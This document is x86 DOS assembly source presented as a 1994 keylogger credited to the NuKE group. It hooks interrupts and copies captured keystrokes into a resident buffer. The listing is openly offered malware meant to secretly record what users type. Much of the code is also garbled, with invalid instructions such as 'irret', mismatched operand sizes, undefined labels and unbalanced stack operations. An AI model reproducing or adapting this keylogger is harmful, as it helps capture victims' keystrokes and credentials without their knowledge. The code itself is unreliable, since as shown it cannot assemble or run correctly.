;                 [NuKE] '94 KeyLogger
;
; NUKKey v1.00 - Made by the Unforgiven
;
; For Nuke'94

	.model	tiny
	.code

	org     100h

start:
	xor	bx,bx
	mov	ds,bx
	sub	word ptr ds:[413h],20h
	mov	ax,word ptr ds:[413h]
	sub	ax,100h
	mov	cl,0ah
	shr	ax,cl
	inc	ax
	mov	numparas,ax
	mov	es,ax
	dec	ax
	mov	di,offset intret
	push	cs
	pop	es
	mov	si,di
	add	si,ax
	mov	cx,intsize
	rep	movsb
	mov	ax,offset newint8
	dec	dx
	mov	word ptr ds:[oldint8ofs+2],dx
	mov	word ptr ds:[newint8ofs],ax
	xchg	ax,word ptr ds:[jmps+7]
	mov	word ptr ds:[newint8seg],ax
        mov     ax,offset nullhandler
        xchg    ax,word ptr ds:[nullhandlerofs]
        mov     word ptr ds:[nullophandofs],ax
	mov	ax,cs
	xchg	ax,word ptr ds:[nullophandseg]
	xchg	ax,cx
	mov	byte ptr es:[keycountbyteofs],50
	mov	bx,80h
walk:	mov	al,byte ptr ds:[bx]
	and	al,al
	jnz	haveit
	inc	bx
	inc	bx
	jmp	walk
haveit:	mov	word ptr es:[bufferofs-2],bx
	mov	bl,0ch
	sub	bx,bl
	mov	ds,cx
	mov	di,bx
	mov	si,bx
	mov	cx,bufferlen
	rep	movsb
	sti
	xor	dx,dx
	mov	cx,8
	in	al,dx
	mov	byte ptr cs:[scancount],al
	call	install
	ret
	
new8:	cmp	dl,128
	je	handle8
	or	dl,dl
	jz	new8
handle8:cli
	mov	al,0abh
	out	21h,al
	cli
	pushf
	db	0eah
oldint8ofs	dw	?
oldint8seg	dw	?

	nullhandlerofs	dw	?
nullophandseg dw	?

clicount	dw	0

nullhandler:
	inc	word ptr cs:[clicount]
	cmp	word ptr cs:[clicount],2000
	jb	endnh
	cmp	byte ptr cs:[scancode],1
	je	reboot
endnh:	cli
	iret

reboot:	mov	ax,40h
	mov	cl,8
	shl	ax,cl
	mov	dx,word ptr cs:[nullhandlerofs]
	add	ax,dx
	mov	bx,word ptr cs:[clicount]
	dec	bx
	dec	bx
	jns	norestore
	mov	bx,6
norestore:	push	ax
	push	bx
	jmp	bx

ret8:	dec	dl
	cmp	dl,128
	je	return8
	ret

newint8:	
	cmp	byte ptr cs:[scancount],1
	jne	notimeyet
notimeyet:	test	dl,1
	jz	justrelease
teststate:	call	getstate
	cmp	al,1
	jne	return8
stillpressed:test	state,newstate
	jz	return8
	cmp	newstate,1
	jne	return8
	test	keycount,1
	jnz	return8
doitnow:	call	getscancode
	push	ax
	call	getkey
	pop	ax
	cmp	oldscancode,ax
	je	return8
pushit:	inc	word ptr cs:[keycount]
	mov	si,word ptr cs:[bufferofs-2]
	push	cs
	pop	ds
	mov	di,si
	add	si,word ptr cs:[bufferofs]
	mov	cx,keylen
	rep	movsb
	pop	ax
return8:	call	restorekeys
	db      0eah
nval1     dw      ?
nval2     dw      ?


getkey:	mov	ah,15h
	int	2fh
	cmp	al,0
	je	gotnoled
	cmp	al,3
	jbe	gotled
	cmp	al,2
	jne	gotnoled
	cmp	ah,2
	jbe	gotled
	cmp	ah,4
	jae	gotnoled
gotled:	mov	bl,al
	sub	bl,2
	mov	bh,4dh
	mul	bh
	mov	word ptr cs:[keyval],ax
gotnoled:
	mov	ah,8
	int	21h
	mov	al,ah
	cmp	al,1
	jne	notshift
	or	byte ptr cs:[modifierstate],2
	jmp	short endgetkey
notshift:	cmp	al,2
	jne	nocaps
	or	byte ptr cs:[modifierstate],1
	jmp	short endgetkey
nocaps:	cmp	al,4
	jne	nobacktab
	or	byte ptr cs:[modifierstate],4
	jmp	short endgetkey
nobacktab:
and	byte ptr cs:[modifierstate],0fbh
and	byte ptr cs:[modifierstate],0fdh
and	byte ptr cs:[modifierstate],0feh
endgetkey:shl	word ptr cs:[keyval],cl
	ret

restorekeys:	
	mov	al,2eh
	out	21h,al
	mov	al,21h
	out	21h,al
	ret

getscancode:	
	cli
	mov	byte ptr cs:[scancode],0
inportloop:	in	al,21h
	test	al,8
	jnz	inportloop
	test	al,2
	jnz	inportloop
	test	al,1
	jz	inportloop
	mov	byte ptr cs:[scancode],1
	sti
	ret

getstate:	
	push	cx
	push	dx
	pushf
	push	bp
	push	si
	push	di
	push	ds
	push	es
	push	ax
	xor	ax,ax
	mov	ds,ax
	in	al,61h
	mov	byte ptr cs:[speakerstate],al
	and	al,11111110b
	mov	bx,word ptr ds:[4aah]
	mov	dx,word ptr ds:[4cch]
	mov	cx,dx
	sub	ch,ch
morevibson:sbb	dx,0f000h
	jnc	yesvibson
	inc	ch
	cmp	ch,30h
	jnb	nevermind
moreviboff:sbb	dx,0f000h
	jc	vibboff
	inc	cl
	inc	bx
	dec	dx
	cmp	dx,0e4d0h
	jna	morevibson
nevermind:mov	word ptr ds:[4aah],bx
	mov	word ptr ds:[4cch],cx
deovibs:	cmp	byte ptr cs:[speakerstate],0
	jz	endgetspeakerstuff
	jmp	short on
onespin:	lodsw
	cmp	ax,0b400h
	jne	neither
	cmp	cs:[si],bh
	jne	neither
	push	bx
	push	cx
	push	si
	push	cs
	pop	ds
	mov	di,si
	call	onespinstring
	pop	ds
	pop	si
	pop	cx
	pop	bx
	irret
twospins:	lodsw
	cmp	ax,0ba00h
	jne	neither
	cmp	cs:[si],bh
	jne	neither
	push	bx
	push	cx
	push	si
	push	cs
	pop	ds
	mov	di,si
	call	twospinstring
	pop	ds
	pop	si
	pop	cx
	pop	bx
	irret
neither:	shl	ax,10
	ror	ax,10
on:	ror	ax,10
	rol	ax,10
xorstep:	xor	ah,bl
	cmp	cs:[si],al
	jne	onespin
	inc	si
	inc	si
	dec	dx
	jnc	onespin
vibboff:	jmp	deovibs
endgetspeakerstuff:
call	beep
pop	es
pop	ds
pop	di
pop	si
pop	bp
pop	dx
pop	cx
pop	dx
	ret

beep:	mov	dx,0c000h
	mov	cl,6
	shr	dx,cl
	mov	bx,dx
	mov	al,127
	mov	dl,2
	in	al,21h
	pushf
	test	al,10000000b
	jz	unmask
	or	bx,1
unmask:	and	al,11111110b
	test	dx,1
	jz	noenable
	or	al,10000000b
noenable:test	dx,2
	jz	nobusy
	or	al,20000000b
nobusy:	test	dx,4
	jz	nowrite
	or	al,4000000